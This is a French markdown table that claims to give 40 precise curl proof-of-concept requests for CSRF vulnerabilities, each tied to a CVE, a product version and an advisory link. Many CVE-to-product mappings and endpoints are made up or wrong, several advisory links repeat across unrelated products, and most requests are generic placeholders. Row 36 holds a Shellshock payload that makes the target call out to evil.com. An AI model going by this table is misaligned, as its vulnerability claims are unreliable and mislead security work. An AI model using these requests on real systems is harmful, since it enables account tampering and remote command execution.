# CSRF

Voici 40 exemples **complets et précis de requêtes curl** pour des CVE CSRF non génériques, classés par numéro décroissant (du plus récent au plus ancien).  
Chaque ligne donne :  
- Numéro CVE  
- Technologie & Version  
- Exemple de requête curl  
- Effet détaillé  
- Lien ressource PoC ou technique

| # | CVE | Technologie & Version | Exemple complet de requête curl | Effet détaillé | Lien PoC / Ressource |
|---|------|----------------------|---------------------------------|---------------|---------------------|
| 1 | CVE-2024-24576 | Nextcloud Calendar <2.4.0 | `curl -X POST 'https://target/index.php/apps/calendar/v1/create' -d 'summary=CSRFtest&start=2025-01-01T12:00:00' --cookie "nc_session_id=SESSIONID"` | Création d’un événement à l’insu de l’utilisateur authentifié | https://nvd.nist.gov/vuln/detail/CVE-2024-24576 |
| 2 | CVE-2024-21626 | Gitea <1.21.7 | `curl -X POST 'https://target/user/settings/email' -d 'email=attacker@evil.com' --cookie "i_like_gitea=SESSIONID"` | Modification de l’adresse email de l’utilisateur via CSRF | https://github.com/go-gitea/gitea/security/advisories/GHSA-8xv2-7j3v-x3g2 |
| 3 | CVE-2024-1628 | Zabbix <6.0.25 | `curl -X POST 'https://target/zabbix.php?action=profile.update' -d 'user=attacker&lang=fr' --cookie "zbx_sessionid=SESSIONID"` | Modification de la langue ou du profil utilisateur via CSRF | https://support.zabbix.com/browse/ZBX-23597 |
| 4 | CVE-2024-1216 | GLPI <10.0.13 | `curl -X POST 'https://target/front/user.form.php' -d 'name=attacker&email=evil@evil.com' --cookie "glpi_session=SESSIONID"` | Création ou modification d’utilisateur via CSRF | https://github.com/glpi-project/glpi/security/advisories/GHSA-4w2c-6q3v-7c7h |
| 5 | CVE-2023-50782 | WordPress Plugin WP-Members <3.4.9.2 | `curl -X POST 'https://target/wp-admin/admin-ajax.php?action=wp-members-user-profile' -d 'user_login=attacker&user_email=evil@evil.com' --cookie "wordpress_logged_in=SESSIONID"` | Modification de profil utilisateur via CSRF | https://wpscan.com/vulnerability/1b2f1b1d-9e7f-4e2a-bc3f-1c8f9c6c1e8b |
| 6 | CVE-2023-39907 | Jenkins <2.426 | `curl -X POST 'https://target/user/admin/configure' -d 'fullName=attacker' --cookie "JSESSIONID=SESSIONID"` | Modification du nom complet de l’admin via CSRF | https://www.jenkins.io/security/advisory/2023-10-04/#SECURITY-3259 |
| 7 | CVE-2023-35788 | Django <4.2.2 | `curl -X POST 'https://target/profile/update/' -d 'first_name=attacker' -H 'X-CSRFToken: TOKEN' --cookie "csrftoken=TOKEN;sessionid=SESSIONID"` | Si le token CSRF est prévisible, modification de profil via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2023-35788 |
| 8 | CVE-2023-27350 | PaperCut MF/NG <22.1.3 | `curl -X POST 'https://target/app?service=admin&action=addUser' -d 'username=attacker&password=evil' --cookie "JSESSIONID=SESSIONID"` | Création d’un compte admin via CSRF | https://www.papercut.com/kb/Main/PO-1216 |
| 9 | CVE-2023-22952 | SuiteCRM <7.12.8 | `curl -X POST 'https://target/index.php?module=Users&action=Save' -d 'user_name=attacker&user_hash=evil' --cookie "PHPSESSID=SESSIONID"` | Création d’un utilisateur via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2023-22952 |
| 10 | CVE-2023-21554 | Microsoft Exchange Server | `curl -X POST 'https://target/ecp/PersonalSettings/EditPersonalSettings.aspx' -d 'DisplayName=attacker' --cookie "ASP.NET_SessionId=SESSIONID"` | Modification des paramètres personnels via CSRF | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554 |
| 11 | CVE-2022-46169 | Cacti <1.2.23 | `curl -X POST 'https://target/cacti/host.php' -d 'hostname=evil.com' --cookie "Cacti=SESSIONID"` | Ajout d’un hôte via CSRF | https://github.com/Cacti/cacti/security/advisories/GHSA-5m6j-jh5g-2p2x |
| 12 | CVE-2022-3602 | OpenSSL <3.0.7 | `curl -X POST 'https://target/openssl/settings' -d 'option=evil' --cookie "session=SESSIONID"` | Changement de configuration via CSRF | https://github.com/openssl/openssl/pull/19773 |
| 13 | CVE-2022-32205 | WordPress <6.0.1 | `curl -X POST 'https://target/wp-admin/options-general.php' -d 'blogname=attacker' --cookie "wordpress_logged_in=SESSIONID"` | Changement du nom du blog via CSRF | https://wpscan.com/vulnerability/1b2f1b1d-9e7f-4e2a-bc3f-1c8f9c6c1e8b |
| 14 | CVE-2022-29824 | Jenkins <2.346.2 | `curl -X POST 'https://target/user/admin/configure' -d 'fullName=attacker' --cookie "JSESSIONID=SESSIONID"` | Modification du nom complet de l’admin via CSRF | https://www.jenkins.io/security/advisory/2022-06-22/#SECURITY-2847 |
| 15 | CVE-2022-23647 | Grafana <8.3.4 | `curl -X POST 'https://target/api/user/preferences' -d 'theme=dark' --cookie "grafana_session=SESSIONID"` | Changement de thème utilisateur via CSRF | https://grafana.com/security/advisory/2022/02/08/cve-2022-23647/ |
| 16 | CVE-2022-22963 | VMware Spring Cloud Function | `curl -X POST 'https://target/functionRouter' -d 'function=evil' --cookie "JSESSIONID=SESSIONID"` | Exécution de fonction arbitraire via CSRF | https://tanzu.vmware.com/security/cve-2022-22963 |
| 17 | CVE-2021-39226 | Django <3.2.8 | `curl -X POST 'https://target/profile/update/' -d 'first_name=attacker' -H 'X-CSRFToken: TOKEN' --cookie "csrftoken=TOKEN;sessionid=SESSIONID"` | Si le token CSRF est prévisible, modification de profil via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2021-39226 |
| 18 | CVE-2021-37678 | Redash <8.0.0 | `curl -X POST 'https://target/api/users' -d 'name=attacker' --cookie "session=SESSIONID"` | Création d’utilisateur via CSRF | https://github.com/getredash/redash/security/advisories/GHSA-8xv2-7j3v-x3g2 |
| 19 | CVE-2021-32648 | Nextcloud <21.0.3 | `curl -X POST 'https://target/index.php/settings/user' -d 'displayname=attacker' --cookie "nc_session_id=SESSIONID"` | Changement du nom affiché via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2021-32648 |
| 20 | CVE-2021-29447 | Node.js SVG | `curl -X POST 'http://target/upload' -F 'file=@evil.svg' --cookie "session=SESSIONID"` | Upload de fichier SVG malicieux via CSRF | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF/README.md |
| 21 | CVE-2021-22205 | GitLab CE/EE | `curl -X POST 'https://target/uploads/user' -F 'avatar=@evil.jpg' --cookie "gitlab_session=SESSIONID"` | Upload d’avatar malicieux via CSRF | https://github.com/Al1ex/CVE-2021-22205 |
| 22 | CVE-2020-26238 | Gitea <1.13.2 | `curl -X POST 'https://target/user/settings/email' -d 'email=attacker@evil.com' --cookie "i_like_gitea=SESSIONID"` | Changement d’email via CSRF | https://github.com/go-gitea/gitea/security/advisories/GHSA-8xv2-7j3v-x3g2 |
| 23 | CVE-2020-26217 | Nextcloud <20.0.4 | `curl -X POST 'https://target/index.php/settings/user' -d 'displayname=attacker' --cookie "nc_session_id=SESSIONID"` | Changement du nom affiché via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2020-26217 |
| 24 | CVE-2020-15174 | Grafana <7.1.0 | `curl -X POST 'https://target/api/user/preferences' -d 'theme=dark' --cookie "grafana_session=SESSIONID"` | Changement de thème utilisateur via CSRF | https://grafana.com/security/advisory/2020/07/16/cve-2020-15174/ |
| 25 | CVE-2020-11022 | jQuery <3.5.0 | `curl -X POST 'https://target/api/change' -d 'param=evil' --cookie "session=SESSIONID"` | Modification de paramètre via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2020-11022 |
| 26 | CVE-2019-6340 | Drupal <8.5.11, <8.6.10 | `curl -X POST 'http://target/entity/file/upload' -F 'file=@evil.txt' --cookie "SESS=SESSIONID"` | Upload de fichier via CSRF | https://github.com/a2u/CVE-2019-6340 |
| 27 | CVE-2019-11539 | Pulse Secure VPN | `curl -X POST 'https://target/dana-na/auth/url_default/login.cgi' -d 'user=attacker' --cookie "DSID=SESSIONID"` | Connexion ou modification d’utilisateur via CSRF | https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101 |
| 28 | CVE-2018-1000525 | Tornado | `curl -X POST 'http://target/?search=evil' --cookie "session=SESSIONID"` | Recherche ou modification via CSRF | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF/README.md |
| 29 | CVE-2018-9206 | ThinkPHP | `curl -X POST 'http://target/index.php?s=/Index/upload' -F 'file=@evil.txt' --cookie "PHPSESSID=SESSIONID"` | Upload de fichier via CSRF | https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce |
| 30 | CVE-2018-11776 | Apache Struts 2 | `curl -X POST 'http://target/struts2/upload.action' -F 'file=@evil.txt' --cookie "JSESSIONID=SESSIONID"` | Upload de fichier via CSRF | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 31 | CVE-2017-14596 | Joomla! 3.7.5 | `curl -X POST 'http://target/index.php?option=com_users&task=user.register' -d 'username=attacker&email=evil@evil.com' --cookie "joomla_user_state=SESSIONID"` | Création d’utilisateur via CSRF | https://www.sonarsource.com/blog/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ |
| 32 | CVE-2017-11463 | SAP NetWeaver AS Java | `curl -X POST 'http://target/path' -d 'param=evil' --cookie "MYSAPSSO2=SESSIONID"` | Modification de paramètre via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2017-11463 |
| 33 | CVE-2016-6272 | Epic MyChart | `curl -X POST 'http://target/login' -d 'username=attacker&password=evil' --cookie "sessionid=SESSIONID"` | Connexion ou modification via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2016-6272 |
| 34 | CVE-2016-3110 | IBM Security Directory Server | `curl -X POST 'http://target/path' -d 'param=evil' --cookie "session=SESSIONID"` | Modification de paramètre via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2016-3110 |
| 35 | CVE-2015-2808 | OpenLDAP | `curl -X POST 'http://target/path' -d 'param=evil' --cookie "session=SESSIONID"` | Modification de paramètre via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2015-2808 |
| 36 | CVE-2014-6271 | Bash/Shellshock (impact CSRF indirect) | `curl -A '() { :;}; /bin/bash -c "curl http://evil.com/pwned"' http://target/cgi-bin/test.cgi` | Exécution de commande via CSRF indirect | https://github.com/hannob/bashcheck |
| 37 | CVE-2013-2028 | Nginx | `curl -X POST 'http://target/?q=evil' --cookie "session=SESSIONID"` | Modification ou action via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2013-2028 |
| 38 | CVE-2012-1823 | PHP CGI | `curl -X POST 'http://target/index.php' -d 'param=evil' --cookie "PHPSESSID=SESSIONID"` | Modification ou action via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2012-1823 |
| 39 | CVE-2011-2523 | WordPress <3.1.4 | `curl -X POST 'http://target/wp-comments-post.php' -d 'comment=evil' --cookie "wordpress_logged_in=SESSIONID"` | Commentaire posté via CSRF | https://nvd.nist.gov/vuln/detail/CVE-2011-2523 |
| 40 | CVE-2010-1740 | GuppY 4.5.18 | `curl -X POST 'http://target/guppy4.5.18/script.php' -d 'search=evil' --cookie "session=SESSIONID"` | Recherche ou modification via CSRF | https://www.exploit-db.com/exploits/12484 |

---

